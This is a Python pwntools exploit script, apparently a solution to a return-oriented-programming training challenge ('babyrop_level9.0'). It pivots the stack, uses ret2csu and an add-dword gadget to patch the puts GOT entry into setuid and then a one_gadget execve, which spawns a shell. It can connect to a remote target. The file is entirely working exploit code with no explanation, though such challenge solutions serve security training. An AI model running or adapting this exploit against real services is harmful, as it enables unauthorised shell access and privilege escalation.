#!/usr/bin/python3
from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./babyrop_level9.0_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''
b*challenge+482
b*challenge+409
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

def ret2csu(rbx, rbp, r12, r13, r14, r15):
    csu_pop = 0x40244a

    payload = flat(
        [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15
        ]
    )

    return payload

ret = 0x000000000040101a
pop_rdi = 0x0000000000402453 # pop rdi; ret
pop_rbp = 0x000000000040129d # pop rbp; ret
leave_ret = 0x00000000004016ab # leave; ret
write_what_where = 0x000000000040129c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
offset_setuid = 0x5fd30
offset_execve = -0x652 # onegadget
rw_section = 0x4150E0

payload = flat(
    [
    pop_rbp,
    rw_section+0x18,
    leave_ret,
    0,
    ret2csu(offset_setuid, exe.got["puts"] + 0x3d, 0, 0, 0, 0),
    write_what_where,
    pop_rdi,
    0,
    exe.plt["puts"],
    ret2csu(offset_execve, exe.got["puts"] + 0x3d, 0, 0, 0, 0),
    write_what_where,
    exe.plt["puts"]
    ]
)

p.send(payload)
interactive()
